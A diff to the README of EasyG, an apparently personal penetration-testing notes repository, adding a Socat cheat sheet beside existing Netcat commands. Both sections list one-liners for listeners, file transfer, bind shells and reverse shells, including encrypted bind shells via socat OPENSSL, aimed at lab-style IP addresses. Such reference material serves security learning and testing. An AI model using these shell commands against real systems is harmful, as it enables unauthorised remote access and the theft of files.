@@ -27,6 +27,7 @@ EasyG started out as a script that I use to automate some information gathering 
   - [Burp Suite](#burp-suite)
   - [EasyG](#easyg)
   - [Netcat](#netcat)
+  - [Socat](#socat)
 - [Network](#network)
 - [Linux](#linux)
 - [Mobile](#mobile)
@@ -388,13 +389,26 @@ EasyG started out as a script that I use to automate some information gathering 
 ### <ins>Netcat</ins>
 
 ```
-nc -nv 10.11.0.22 110                                                      Connect to a TCP port
-nc -nlvp 4444                                                              Set up a listener
-nc -nv 10.11.0.22 4444                                                     Connect to a listener
-nc -nlvp 4444 > incoming.exe                                               Receive a file
-nc -nv 10.11.0.22 4444 < /usr/share/windows-resources/binaries/wget.exe    Transfer a file
-nc -nlvp 4444 -e cmd.exe                                                   Set up a bind shell
-nc -nv 10.11.0.22 4444 -e /bin/bash                                        Send a reverse shell
+nc -nv 10.11.0.22 110                                                        Connect to a TCP port
+nc -nlvp 4444                                                                Set up a listener
+nc -nv 10.11.0.22 4444                                                       Connect to a listener
+nc -nlvp 4444 > incoming.exe                                                 Receive a file
+nc -nv 10.11.0.22 4444 < /usr/share/windows-resources/binaries/wget.exe      Transfer a file
+nc -nlvp 4444 -e cmd.exe                                                     Set up a bind shell
+nc -nv 10.11.0.22 4444 -e /bin/bash                                          Send a reverse shell
+```
+
+### <ins>Socat</ins>
+
+```
+socat - TCP4:<remote server's ip address>:80                                 Connect to a remote server on port 80
+socat TCP4-LISTEN:443 STDOUT                                                 Create a listener
+socat -d -d TCP4-LISTEN:443 STDOUT                                           Create a listener, -d -d for more verbosity
+socat TCP4-LISTEN:443,fork file:secret.txt                                   Transfer a file
+socat TCP4:10.11.0.4:443 file:received_secret.txt,create                     Receive a file
+socat TCP4:10.11.0.22:443 EXEC:/bin/bash                                     Send a reverse shell
+socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash    Create an encrypted bind shell
+socat - OPENSSL:10.11.0.4:443,verify=0                                       Connect to an encrypted bind shell
 ```
 
 
